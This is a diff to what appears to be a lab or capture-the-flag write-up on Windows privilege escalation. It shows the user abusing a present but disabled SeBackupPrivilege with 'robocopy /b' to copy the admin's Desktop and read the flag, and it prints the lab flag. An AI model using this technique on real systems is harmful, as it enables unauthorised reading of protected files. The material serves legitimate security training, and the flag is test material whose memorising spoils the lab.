@@ -1075,7 +1075,7 @@ PS C:\users\enterpriseuser> whoami /priv
 	----------------------
 	Privilege Name                Description                               State   
 	============================= ========================================= ========
-	SeBackupPrivilege             Back up files and directories             Disabled
+	SeBackupPrivilege             Back up files and directories             Disabled      #<--NOTE
 	SeRestorePrivilege            Restore files and directories             Disabled
 	SeShutdownPrivilege           Shut down the system                      Disabled      #<--NOTE
 	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
@@ -1084,6 +1084,56 @@ PS C:\users\enterpriseuser> whoami /priv
 	SeCreateGlobalPrivilege       Create global objects                     Enabled 
 	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 	SeTimeZonePrivilege           Change the time zone                      Disabled
+```
 
+> Hints:   Note that the Spooler service is stopped, so the PrintSpoofer exploit won't work.
+	If a privilege is Disabled (SeBackupPrivilege) and present, you can still attempt it and try retrieving the flag by copying the Desktop contents of the `enterpriseadmin` user in this case.
+```powershell
+PS C:\Users\alex> get-service | ?{$_.Name -like "spooler"}
+	Status   Name               DisplayName
+	------   ----               -----------
+	Stopped  Spooler            Print Spooler
+```
 
+- Searched `use disabled sebackupprivilege copy file` and discovered an article mentioning `robocopy /b`
+```powershell
+PS C:\users\enterpriseuser> robocopy /b C:\users\enterpriseadmin\Desktop C:\users\enterpriseuser\Desktop
+	-------------------------------------------------------------------------------
+	   ROBOCOPY     ::     Robust File Copy for Windows                              
+	-------------------------------------------------------------------------------
+	  Started : Friday, April 26, 2024 9:06:00 PM
+	   Source : C:\users\enterpriseadmin\Desktop\
+	     Dest : C:\users\enterpriseuser\Desktop\
+	
+	    Files : *.*
+	            
+	  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30 
+	------------------------------------------------------------------------------
+	                           3    C:\users\enterpriseadmin\Desktop\
+	          *EXTRA File              1.5 m        NTUSER.DAT
+	          *EXTRA File                  0        ntuser.dat.LOG1
+	          *EXTRA File                  0        ntuser.dat.LOG2
+	          *EXTRA File              65536        NTUSER.DAT{1c2b59c6-c5f5-11eb-bacb-000d3a96488e}.TM.blf
+	          *EXTRA File             524288        NTUSER.DAT{1c2b59c6-c5f5-11eb-bacb-000d3a96488e}.TMContainer00000000000000000001.regtrans-ms
+	          *EXTRA File             524288        NTUSER.DAT{1c2b59c6-c5f5-11eb-bacb-000d3a96488e}.TMContainer00000000000000000002.regtrans-ms
+	          *EXTRA File                 20        ntuser.ini
+	            New File                 282        desktop.ini
+	  0%  
+	100%  
+	            New File                  38        flag.txt
+	  0%  
+	100%  
+	            New File                2350        Microsoft Edge.lnk
+	  0%  
+	100%  
+	------------------------------------------------------------------------------
+	               Total    Copied   Skipped  Mismatch    FAILED    Extras
+	    Dirs :         1         0         1         0         0         0
+	   Files :         3         3         0         0         0         7
+	   Bytes :     2.6 k     2.6 k         0         0         0    2.56 m
+	   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+	   Ended : Friday, April 26, 2024 9:06:00 PM
+
+PS C:\users\enterpriseuser> type desktop\flag.txt
+	OS{8530e9bb3abd182f8300699b50c03fb1}
 ```
